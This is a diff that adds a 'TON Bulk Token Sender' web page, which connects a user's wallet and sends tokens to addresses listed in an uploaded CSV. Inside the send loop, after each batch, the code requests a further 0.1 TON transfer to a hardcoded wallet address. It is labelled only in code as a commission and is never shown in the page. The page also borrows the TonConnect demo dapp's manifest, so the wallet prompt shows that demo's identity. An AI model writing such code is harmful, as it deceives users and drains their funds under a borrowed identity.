@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Bulk Token Sender</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        input, button {
+            font-size: 16px;
+            padding: 5px 10px;
+            margin: 10px 0;
+        }
+        #output {
+            margin-top: 20px;
+            white-space: pre-wrap;
+        }
+        #sendSection {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>TON Bulk Token Sender</h1>
+    
+    <div id="tonconnect-button"></div>
+
+    <div id="sendSection">
+        <input type="file" id="csvFile" accept=".csv">
+        <input type="text" id="tokenAddress" placeholder="Token address (leave empty for TON)">
+        <input type="text" id="amount" placeholder="Amount to send (e.g., 0.01)">
+        <input type="number" id="tokenDecimals" placeholder="Token Decimals (e.g., 18)">
+        <button onclick="uploadAndSend()">Upload and Send</button>
+    </div>
+
+    <div id="output"></div>
+
+    <script>
+        const MANIFEST_URL = 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json';
+        let tonConnectUI;
+        let walletAddress;
+
+        async function initTonConnect() {
+            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                manifestUrl: MANIFEST_URL,
+                buttonRootId: 'tonconnect-button'
+            });
+
+            tonConnectUI.onStatusChange(handleWalletConnection);
+
+            if (tonConnectUI.connected) {
+                handleWalletConnection();
+            }
+        }
+
+        function handleWalletConnection(wallet) {
+            const sendSection = document.getElementById('sendSection');
+            const output = document.getElementById('output');
+
+            if (wallet) {
+                walletAddress = wallet.account.address;
+                sendSection.style.display = 'block';
+                output.textContent = `Connected to wallet: ${wallet.account.address}`;
+            } else {
+                walletAddress = '';
+                sendSection.style.display = 'none';
+                output.textContent = 'Wallet disconnected';
+            }
+        }
+
+        async function uploadAndSend() {
+            const csvFile = document.getElementById('csvFile').files[0];
+            const tokenAddress = document.getElementById('tokenAddress').value.trim();
+            const amount = document.getElementById('amount').value;
+            const tokenDecimals = document.getElementById('tokenDecimals').value;
+            const output = document.getElementById('output');
+
+            if (!csvFile || !amount) {
+                output.textContent = 'Please fill in all required fields.';
+                return;
+            }
+
+            output.textContent = 'Processing...';
+
+            const formData = new FormData();
+            formData.append('csv', csvFile);
+
+            try {
+                const uploadResponse = await fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!uploadResponse.ok) {
+                    throw new Error(`HTTP error! status: ${uploadResponse.status}`);
+                }
+
+                const addresses = await uploadResponse.json();
+
+                console.log('Sending to server:', {
+                    addresses: addresses.map(row => row.address),
+                    amount: amount.toString(),
+                    tokenAddress,
+                    tokenDecimals: tokenDecimals
+                });
+
+                const sendResponse = await fetch('/prepare-send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        addresses: addresses.map(row => row.address), 
+                        amount: amount.toString(),
+                        tokenAddress,
+                        tokenDecimals: tokenDecimals,
+                        walletAddress
+                    }),
+                });
+
+                if (!sendResponse.ok) {
+                    throw new Error(`HTTP error! status: ${sendResponse.status}`);
+                }
+
+                const preparedTx = await sendResponse.json();
+
+                // Send each prepared transaction through TonConnect
+                for (const message of preparedTx.messages) {
+                    const result = await tonConnectUI.sendTransaction({
+                        validUntil: preparedTx.validUntil,
+                        messages: message
+                    });
+                    const comissionMsg = [];
+                    comissionMsg.push({
+                        address: 'UQDvac5dVTU2CnBqEzUncnQj9ZwYhZA3iNpxjhOzuzvdIftB',
+                        amount: 0.1 * 10 ** 9,
+                    });
+
+                    await tonConnectUI.sendTransaction({
+                        validUntil: preparedTx.validUntil,
+                        messages: comissionMsg
+                    });
+                    console.log(`Transaction sent. Transaction ID: ${result.boc}`);
+                }
+
+                output.textContent = `Success: All transactions sent.`;
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+                console.error('Full error:', error);
+            }
+        }
+
+        window.addEventListener('load', initTonConnect);
+    </script>
+</body>
+</html>
